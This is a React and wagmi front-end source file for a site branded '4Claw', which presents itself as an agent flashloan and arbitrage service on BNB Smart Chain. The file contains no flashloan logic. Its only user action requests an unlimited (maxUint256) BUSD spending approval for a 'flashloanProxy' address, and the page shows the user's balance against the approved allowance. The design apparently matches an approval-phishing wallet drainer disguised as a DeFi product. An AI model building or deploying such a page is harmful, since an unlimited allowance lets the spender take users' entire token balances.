import { ConnectButton, useConnectModal } from '@rainbow-me/rainbowkit'
import { useEffect, useState } from 'react'
import {
  FaArrowUpRightFromSquare,
  FaGlobe,
  FaGithub,
  FaTelegram,
} from 'react-icons/fa6'
import { SiBinance, SiLinktree } from 'react-icons/si'
import {
  useAccount,
  useReadContract,
  useSwitchChain,
  useWaitForTransactionReceipt,
  useWriteContract,
} from 'wagmi'
import { formatUnits, maxUint256 } from 'viem'

import {
  APP_NAME,
  CONTRACTS,
  EXTERNAL_LINKS,
  USING_FALLBACK_PROJECT_ID,
} from './config'
import { getText, languages } from './i18n'
import './App.css'

const erc20Abi = [
  {
    type: 'function',
    stateMutability: 'view',
    name: 'allowance',
    inputs: [
      { name: 'owner', type: 'address' },
      { name: 'spender', type: 'address' },
    ],
    outputs: [{ name: '', type: 'uint256' }],
  },
  {
    type: 'function',
    stateMutability: 'view',
    name: 'balanceOf',
    inputs: [{ name: 'account', type: 'address' }],
    outputs: [{ name: '', type: 'uint256' }],
  },
  {
    type: 'function',
    stateMutability: 'nonpayable',
    name: 'approve',
    inputs: [
      { name: 'spender', type: 'address' },
      { name: 'value', type: 'uint256' },
    ],
    outputs: [{ name: '', type: 'bool' }],
  },
]

function App() {
  const [language, setLanguage] = useState('en')
  const [isBooting, setIsBooting] = useState(true)

  const { address, chainId, isConnected } = useAccount()
  const { openConnectModal } = useConnectModal()
  const { switchChainAsync, isPending: isSwitching } = useSwitchChain()
  const {
    writeContract,
    data: approvalHash,
    error: writeError,
    isPending: isWritePending,
  } = useWriteContract()

  const { isLoading: isConfirming, isSuccess: isConfirmed } =
    useWaitForTransactionReceipt({
      chainId: CONTRACTS.chainId,
      hash: approvalHash,
    })

  const {
    data: tokenBalance = 0n,
    refetch: refetchBalance,
    isLoading: isBalanceLoading,
  } = useReadContract({
    chainId: CONTRACTS.chainId,
    address: CONTRACTS.token.address,
    abi: erc20Abi,
    functionName: 'balanceOf',
    args: address ? [address] : undefined,
    query: { enabled: Boolean(address) },
  })

  const {
    data: allowance = 0n,
    refetch: refetchAllowance,
  } = useReadContract({
    chainId: CONTRACTS.chainId,
    address: CONTRACTS.token.address,
    abi: erc20Abi,
    functionName: 'allowance',
    args: address ? [address, CONTRACTS.flashloanProxy] : undefined,
    query: { enabled: Boolean(address) },
  })

  useEffect(() => {
    if (!isConfirmed) return
    refetchBalance()
    refetchAllowance()
  }, [isConfirmed, refetchAllowance, refetchBalance])

  useEffect(() => {
    const timer = window.setTimeout(() => {
      setIsBooting(false)
    }, 2300)

    return () => window.clearTimeout(timer)
  }, [])

  const t = (path) => getText(language, path)
  const isWrongNetwork = isConnected && chainId !== CONTRACTS.chainId
  const effectiveLiquidity = allowance < tokenBalance ? allowance : tokenBalance
  const coverageRatio =
    tokenBalance === 0n ? 0 : Number((allowance * 10000n) / tokenBalance) / 100
  const canSubmit =
    isConnected &&
    !isWrongNetwork &&
    !isWritePending &&
    !isConfirming

  const featuredRows = [
    {
      code: '[01]',
      label: t('metrics.walletBalance'),
      value: isConnected
        ? formatToken(tokenBalance, CONTRACTS.token.decimals, CONTRACTS.token.symbol)
        : t('metrics.disconnected'),
      note: isBalanceLoading ? 'LOADING...' : CONTRACTS.token.name.toUpperCase(),
    },
    {
      code: '[02]',
      label: t('metrics.approved'),
      value: isConnected
        ? formatAllowanceDisplay(
            allowance,
            CONTRACTS.token.decimals,
            CONTRACTS.token.symbol,
          )
        : t('metrics.disconnected'),
      note: CONTRACTS.token.symbol,
    },
  ]

  const guideSteps = [
    {
      code: '[01]',
      title: t('layout.sendPrompt'),
      body: `"Approve BUSD allowance for the 4Claw proxy on BSC"`,
    },
    {
      code: '[02]',
      title: t('approval.title'),
      body: t('flow.steps')[0].body,
    },
    {
      code: '[03]',
      title: t('flow.steps')[2].title,
      body: t('flow.steps')[2].body,
    },
  ]

  const recentFeed = [
    {
      tag: 'STATUS',
      value: approvalHash
        ? isConfirmed
          ? t('approval.success')
          : t('approval.actionConfirming')
        : t('layout.loadingApprovalData'),
    },
    {
      tag: 'ALLOWANCE',
      value: isConnected
        ? formatAllowanceDisplay(
            allowance,
            CONTRACTS.token.decimals,
            CONTRACTS.token.symbol,
          )
        : t('metrics.disconnected'),
    },
    {
      tag: 'COVERAGE',
      value: isConnected ? `${coverageRatio.toFixed(2)}%` : t('metrics.disconnected'),
    },
  ]

  const footerProducts = [
    t('layout.approveTerminal'),
    t('layout.allowanceMonitor'),
    t('layout.bscExecution'),
  ]

  async function handleApprove() {
    if (!isConnected) {
      openConnectModal?.()
      return
    }

    if (isWrongNetwork) {
      await switchChainAsync({ chainId: CONTRACTS.chainId })
      return
    }

    writeContract({
      chainId: CONTRACTS.chainId,
      address: CONTRACTS.token.address,
      abi: erc20Abi,
      functionName: 'approve',
      args: [CONTRACTS.flashloanProxy, maxUint256],
    })
  }

  return (
    <div className="benchmark-shell">
      <div className="screen-noise" />

      {isBooting ? (
        <div className="boot-overlay" aria-hidden="true">
          <div className="boot-card">
            <p className="mono-label">{t('layout.protocol')}</p>
            <p className="booting-label">{t('layout.booting')}</p>
            <img src="/logo.png" alt="4Claw logo" className="boot-logo" />
            <h2>4CLAW</h2>
            <span>{t('layout.online')}</span>
            <div className="boot-progress">
              <div className="boot-progress-bar" />
            </div>
          </div>
        </div>
      ) : null}

      <header className="top-shell">
        <p className="mono-label">{t('layout.protocol')}</p>
        <p className="booting-label">{t('layout.booting')}</p>

        <div className="brand-stage">
          <img src="/logo.png" alt="4Claw logo" />
          <div className="brand-stage-copy">
            <span>4CLAW</span>
            <strong>{t('layout.online')}</strong>
          </div>
        </div>

        <div className="header-controls">
          <LanguageSwitcher
            currentLanguage={language}
            onChange={setLanguage}
          />
          <ConnectButton accountStatus="avatar" chainStatus="icon" showBalance={false} />
        </div>
      </header>

      <main className="benchmark-main">
        <section className="hero-shell">
          <div className="hero-visual-shell">
            <img className="hero-logo" src="/logo.png" alt="4Claw emblem" />
          </div>

          <div className="hero-copy-shell">
            <h1>
              Agent Flashloans
              <span>for On-Chain Arbitrage</span>
            </h1>
            <p className="hero-powered">{t('layout.powered')}</p>
            <p className="hero-description">{t('meta.description')}</p>

            <div className="hero-actions">
              <a className="hero-action" href="#approve-terminal">
                {t('meta.primaryCta')}
              </a>
              <a className="hero-link" href="#contracts">
                {t('contracts.sectionTitle')}
              </a>
            </div>
          </div>
        </section>

        <section className="content-shell">
          <div className="feature-shell">
            <div className="feature-head">
              <p className="mono-label">{t('layout.featuredAsset')}</p>
              <h2>{CONTRACTS.token.symbol}</h2>
              <span>{CONTRACTS.token.name}</span>
            </div>

            <div className="feature-grid">
              {featuredRows.map((row) => (
                <article className="feature-row" key={row.code + row.label}>
                  <span className="row-index">{row.code}</span>
                  <div>
                    <p>{row.label}</p>
                    <strong>{row.value}</strong>
                    <small>{row.note}</small>
                  </div>
                </article>
              ))}
            </div>
          </div>

          <section className="approve-shell" id="approve-terminal">
            <div className="approve-head">
              <p className="mono-label">{t('layout.launchTerminal')}</p>
              <h2>{t('approval.sectionTitle')}</h2>
            </div>

            {USING_FALLBACK_PROJECT_ID ? (
              <Notice tone="warning">{t('warnings.walletConnect')}</Notice>
            ) : null}
            {!isConnected ? <Notice tone="info">{t('warnings.noWallet')}</Notice> : null}
            {isWrongNetwork ? <Notice tone="danger">{t('warnings.wrongNetwork')}</Notice> : null}

            <div className="approve-command">
              <span>agent@node:~$</span>
              <code>approve --token BUSD --spender {shortenAddress(CONTRACTS.flashloanProxy)} --amount max</code>
            </div>

            <div className="approve-summary">
              <p>{t('approval.description')}</p>
              <small>{t('approval.helperUnlimited')}</small>
            </div>

            <div className="approve-ledger">
              <LedgerItem
                label={t('approval.spender')}
                value={CONTRACTS.flashloanProxy}
              />
              <LedgerItem
                label={t('approval.walletBalance')}
                value={formatToken(
                  tokenBalance,
                  CONTRACTS.token.decimals,
                  CONTRACTS.token.symbol,
                )}
              />
              <LedgerItem
                label={t('approval.currentAllowance')}
                value={formatAllowanceDisplay(
                  allowance,
                  CONTRACTS.token.decimals,
                  CONTRACTS.token.symbol,
                )}
              />
              <LedgerItem
                label={t('approval.effectiveLiquidity')}
                value={formatToken(
                  effectiveLiquidity,
                  CONTRACTS.token.decimals,
                  CONTRACTS.token.symbol,
                )}
              />
            </div>

            <button
              className="approve-submit"
              type="button"
              onClick={handleApprove}
              disabled={!isConnected ? false : !isWrongNetwork && !canSubmit}
            >
              {!isConnected
                ? t('approval.actionConnect')
                : isWrongNetwork
                  ? t('approval.actionSwitch')
                  : isWritePending
                    ? t('approval.actionPending')
                    : isConfirming || isSwitching
                      ? t('approval.actionConfirming')
                      : `${t('approval.actionApprove')} MAX`}
            </button>

            {writeError ? <Notice tone="danger">{normalizeError(writeError.message)}</Notice> : null}

            {approvalHash ? (
              <Notice tone={isConfirmed ? 'success' : 'info'}>
                <span>{isConfirmed ? t('approval.success') : t('approval.actionConfirming')}</span>
                <a
                  href={`${EXTERNAL_LINKS.bscscan}/tx/${approvalHash}`}
                  target="_blank"
                  rel="noreferrer"
                >
                  {t('approval.txLink')}
                </a>
              </Notice>
            ) : null}
          </section>
        </section>

        <section className="content-shell secondary-shell">
          <div className="recent-shell">
            <div className="recent-head">
              <h2>{t('layout.recentApprovals')}</h2>
              <span>{approvalHash ? 'LIVE' : 'SYNCING'}</span>
            </div>

            <div className="recent-list">
              {recentFeed.map((item) => (
                <div className="recent-row" key={item.tag}>
                  <span>{item.tag}</span>
                  <code>{item.value}</code>
                </div>
              ))}
            </div>
          </div>

          <div className="guide-shell">
            <div className="guide-head">
              <p className="mono-label">{t('layout.installationGuide')}</p>
              <h2>{t('flow.sectionTitle')}</h2>
            </div>

            <div className="guide-list">
              {guideSteps.map((step) => (
                <article className="guide-item" key={step.code}>
                  <span className="row-index">{step.code}</span>
                  <div>
                    <h3>{step.title}</h3>
                    <p>{step.body}</p>
                  </div>
                </article>
              ))}
            </div>

            <div className="terminal-snippet">
              <p>{t('layout.launchTerminal')}</p>
              <code>agent@node:~$ cat approve_config.json</code>
              <code>// approving flashloan allowance on bsc...</code>
            </div>
          </div>
        </section>

        <footer className="footer-shell" id="contracts">
          <div className="footer-brand">
            <img src="/logo.png" alt="4Claw logo" />
            <div>
              <h2>4CLAW</h2>
              <p>{t('meta.description')}</p>
              <span>{t('layout.systemOperational')}</span>
            </div>
          </div>

          <div className="footer-columns">
            <FooterGroup title={t('layout.products')} items={footerProducts} />
            <FooterGroup
              title={t('layout.protocolLinks')}
              links={[
                { label: t('footer.website'), href: EXTERNAL_LINKS.website, icon: <FaGlobe /> },
                { label: t('footer.telegram'), href: EXTERNAL_LINKS.telegram, icon: <FaTelegram /> },
                { label: t('footer.github'), href: EXTERNAL_LINKS.github, icon: <FaGithub /> },
                { label: t('footer.linktree'), href: EXTERNAL_LINKS.linktree, icon: <SiLinktree /> },
              ]}
            />
            <FooterGroup
              title={t('layout.ecosystem')}
              links={[
                { label: 'BSC', href: EXTERNAL_LINKS.bscscan, icon: <SiBinance /> },
                { label: t('contracts.proxy'), href: `${EXTERNAL_LINKS.bscscan}/address/${CONTRACTS.flashloanProxy}`, icon: <FaArrowUpRightFromSquare /> },
                { label: t('contracts.token'), href: `${EXTERNAL_LINKS.bscscan}/token/${CONTRACTS.token.address}`, icon: <FaArrowUpRightFromSquare /> },
              ]}
            />
            <FooterGroup
              title={t('layout.contractAddresses')}
              items={[
                shortenAddress(CONTRACTS.flashloanProxy),
                shortenAddress(CONTRACTS.implementation),
                shortenAddress(CONTRACTS.create2Factory),
              ]}
            />
          </div>
        </footer>
      </main>
    </div>
  )
}

function LanguageSwitcher({ currentLanguage, onChange }) {
  return (
    <div className="language-switcher">
      {languages.map((item) => (
        <button
          key={item.code}
          className={`language-pill ${currentLanguage === item.code ? 'active' : ''}`}
          type="button"
          onClick={() => onChange(item.code)}
        >
          {item.label}
        </button>
      ))}
    </div>
  )
}

function Notice({ children, tone }) {
  return <div className={`notice ${tone}`}>{children}</div>
}

function LedgerItem({ label, value }) {
  return (
    <div className="ledger-item">
      <span>{label}</span>
      <code>{value}</code>
    </div>
  )
}

function FooterGroup({ title, items = [], links = [] }) {
  return (
    <div className="footer-group">
      <h3>{title}</h3>
      {items.length ? (
        <ul>
          {items.map((item) => (
            <li key={item}>{item}</li>
          ))}
        </ul>
      ) : null}
      {links.length ? (
        <ul>
          {links.map((item) => (
            <li key={item.label}>
              <a href={item.href} target="_blank" rel="noreferrer">
                {item.icon}
                <span>{item.label}</span>
              </a>
            </li>
          ))}
        </ul>
      ) : null}
    </div>
  )
}

function formatToken(value, decimals, symbol) {
  const amount = Number(formatUnits(value, decimals))
  if (!Number.isFinite(amount)) return `0 ${symbol}`
  return `${new Intl.NumberFormat('en-US', {
    maximumFractionDigits: amount >= 1000 ? 0 : 4,
  }).format(amount)} ${symbol}`
}

function formatAllowanceDisplay(value, decimals, symbol) {
  if (value === maxUint256) return `Unlimited ${symbol}`
  return formatToken(value, decimals, symbol)
}

function shortenAddress(address) {
  return `${address.slice(0, 6)}...${address.slice(-4)}`
}

function normalizeError(message) {
  if (!message) return 'Transaction failed.'
  return message.replace('User rejected the request.', 'Transaction rejected in wallet.')
}
export default App
